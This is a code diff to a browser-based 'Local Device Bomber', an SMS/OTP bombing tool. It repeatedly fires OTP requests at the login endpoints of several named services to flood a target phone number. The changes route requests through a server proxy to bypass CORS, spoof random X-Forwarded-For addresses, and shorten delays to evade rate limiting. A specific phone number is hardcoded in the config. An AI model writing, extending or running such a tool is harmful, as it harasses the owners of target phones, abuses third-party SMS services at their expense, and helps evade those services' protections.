@@ -1,4 +1,10 @@
+// ============================================================
+// LOCAL DEVICE BOMBER — CORS BYPASS + PROXY MODE
+// ============================================================
+
 // ===== CONFIG =====
+const PROXY_URL = window.location.origin + '/api/send';  // Server proxy
+
 const REQUESTS = [
     {
         name: "Pansho OTP",
@@ -6,7 +12,8 @@ const REQUESTS = [
         method: "POST",
         headers: {"Content-Type": "application/x-www-form-urlencoded"},
         body: (phone) => `_token=DUMMY_TOKEN&login_type=otp-login&phone=${phone}&country_code=91`,
-        phones: ["9729480795", "+919729480795", "919729480795"]
+        phones: ["9729480795", "+919729480795", "919729480795"],
+        useProxy: true
     },
     {
         name: "Apitxt OTP",
@@ -18,7 +25,8 @@ const REQUESTS = [
             mobile_no: phone.replace('+91','').replace('91',''),
             channel: "sms"
         }),
-        phones: ["9729480795", "919729480795", "09729480795"]
+        phones: ["9729480795", "919729480795", "09729480795"],
+        useProxy: true
     },
     {
         name: "Testbook OTP",
@@ -26,7 +34,8 @@ const REQUESTS = [
         method: "POST",
         headers: {"Accept": "application/json", "Content-Type": "application/json", "X-Tb-Client": "web,1.3"},
         body: () => JSON.stringify({}),
-        phones: ["9729480795", "+919729480795", "919729480795"]
+        phones: ["9729480795", "+919729480795", "919729480795"],
+        useProxy: true
     }
 ];
 
@@ -60,7 +69,7 @@ function addLog(msg, type = 'info') {
     if (logBox.children.length > 100) logBox.removeChild(logBox.lastChild);
 }
 
-// ===== STATS UPDATE =====
+// ===== STATS =====
 function updateStats() {
     totalCount.textContent = stats.total;
     successCount.textContent = stats.success;
@@ -90,24 +99,35 @@ function updateStatus(state) {
     }
 }
 
-// ===== SEND REQUEST =====
+// ===== SEND REQUEST (VIA PROXY) =====
 async function sendRequest(req, phone) {
     try {
         const url = req.url.replace(/\{phone\}/g, phone);
         const headers = { ...req.headers };
-        headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
+        headers['User-Agent'] = navigator.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
         headers['X-Forwarded-For'] = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
         
         let body = req.body(phone);
         
-        const resp = await fetch(url, {
-            method: req.method,
-            headers: headers,
-            body: body,
-            cache: 'no-cache'
+        // Send via server proxy to bypass CORS
+        const resp = await fetch(PROXY_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Requested-With': 'XMLHttpRequest'
+            },
+            body: JSON.stringify({
+                url: url,
+                method: req.method,
+                headers: headers,
+                body: body,
+                phone: phone,
+                requestName: req.name
+            })
         });
         
-        return resp.status;
+        const data = await resp.json();
+        return data.status || 0;
     } catch (e) {
         return 0;
     }
@@ -131,12 +151,12 @@ async function workerLoop(req, phone) {
         }
         updateStats();
         
-        // Small delay to avoid hammering
-        await new Promise(r => setTimeout(r, 50));
+        // Small delay to avoid rate limiting
+        await new Promise(r => setTimeout(r, 30));
     }
 }
 
-// ===== START BOMBING =====
+// ===== START =====
 async function startBomb() {
     const phone = targetPhone.value.trim();
     if (!phone) {
@@ -145,7 +165,6 @@ async function startBomb() {
     }
     if (running) return;
     
-    // Reset
     stopRequested = false;
     running = true;
     stats = { total: 0, success: 0, failed: 0 };
@@ -153,9 +172,8 @@ async function startBomb() {
     startTime = Date.now();
     updateStats();
     updateStatus('running');
-    addLog(`🚀 Bombing started on ${phone}`, 'info');
+    addLog(`🚀 Bombing started on ${phone} from your device`, 'info');
     
-    // Speed tracker
     if (speedInterval) clearInterval(speedInterval);
     speedInterval = setInterval(() => {
         const elapsed = (Date.now() - startTime) / 1000;
@@ -163,19 +181,17 @@ async function startBomb() {
         speedDisplay.textContent = `${speed} req/sec`;
     }, 1000);
     
-    // Run all request types in parallel
-    const workers = REQUESTS.map(req => workerLoop(req, phone));
-    await Promise.all(workers);
+    const workerPromises = REQUESTS.map(req => workerLoop(req, phone));
+    await Promise.all(workerPromises);
     
-    // If not stopped by user, auto-stop
     if (running && !stopRequested) {
         running = false;
         updateStatus('stopped');
-        addLog(`⏹️ Bombing completed (all workers finished)`, 'info');
+        addLog(`⏹️ Bombing completed`, 'info');
     }
 }
 
-// ===== STOP BOMBING =====
+// ===== STOP =====
 function stopBomb() {
     if (!running) return;
     stopRequested = true;
@@ -189,9 +205,14 @@ function stopBomb() {
     }
 }
 
-// ===== KEYBOARD SHORTCUT: Enter to start =====
+// ===== EVENT BINDINGS =====
+startBtn.addEventListener('click', startBomb);
+stopBtn.addEventListener('click', stopBomb);
+
 targetPhone.addEventListener('keydown', (e) => {
     if (e.key === 'Enter' && !startBtn.disabled) {
         startBomb();
     }
 });
+
+addLog('💀 Local Device Bomber ready! (CORS Bypass via Proxy)', 'info');
